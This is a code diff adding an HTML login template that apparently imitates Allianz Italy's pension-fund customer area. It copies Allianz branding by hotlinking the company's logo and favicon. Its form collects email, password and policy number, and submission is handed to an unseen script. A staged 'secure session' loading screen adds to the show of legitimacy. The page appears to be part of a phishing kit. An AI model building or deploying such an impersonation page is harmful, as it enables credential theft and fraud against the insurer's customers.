@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Allianz - Accedi all'Area Riservata</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='css/style.css') }}">
+    <link rel="shortcut icon" href="https://areapersonale.allianz.it/digitalme/assets/img/favicon.ico">
+</head>
+<body>
+    <script>
+        (function() {
+            const theme = localStorage.getItem('theme');
+            if (theme === 'dark') {
+                document.body.classList.add('dark-theme');
+            }
+        })();
+    </script>
+    <div class="floating-controls">
+        <button id="theme-toggle" class="floating-btn theme-toggle-btn" aria-label="Toggle theme" title="Cambia tema">
+            <span class="theme-toggle-icon">🌙</span>
+        </button>
+    </div>
+
+    <div class="container">
+        <div class="logo-header">
+            <img src="https://www.allianz.it/content/dam/onemarketing/system/allianz-logo.svg" alt="Allianz Logo">
+            <h1>Area Personale</h1>
+            <p>Accedi per gestire il tuo Fondo Pensione</p>
+        </div>
+
+        <div class="error-message" id="error-msg"></div>
+
+        <form id="login-form">
+            <div class="form-group">
+                <input type="email" id="username" class="form-input" placeholder=" " required autocomplete="username">
+                <label for="username" class="form-label">Email (Utente)</label>
+            </div>
+
+            <div class="form-group">
+                <input type="password" id="password" class="form-input" placeholder=" " required autocomplete="current-password">
+                <label for="password" class="form-label">Password</label>
+            </div>
+
+            <div class="form-group">
+                <input type="text" id="policy_number" class="form-input" placeholder=" " required pattern="[0-9]+" inputmode="numeric">
+                <label for="policy_number" class="form-label">Numero Polizza</label>
+            </div>
+
+            <button type="submit" id="submit-btn" class="btn-submit">Accedi</button>
+        </form>
+    </div>
+
+    <!-- Multi-step dynamic loading screen -->
+    <div class="loading-overlay" id="loading-overlay">
+        <div class="spinner"></div>
+        <div class="loading-step" id="loading-step">Inizializzazione sessione sicura...</div>
+        <div class="loading-subtext" id="loading-subtext">Fase 1 di 6</div>
+    </div>
+
+    <script src="{{ url_for('static', filename='js/main.js') }}"></script>
+</body>
+</html>
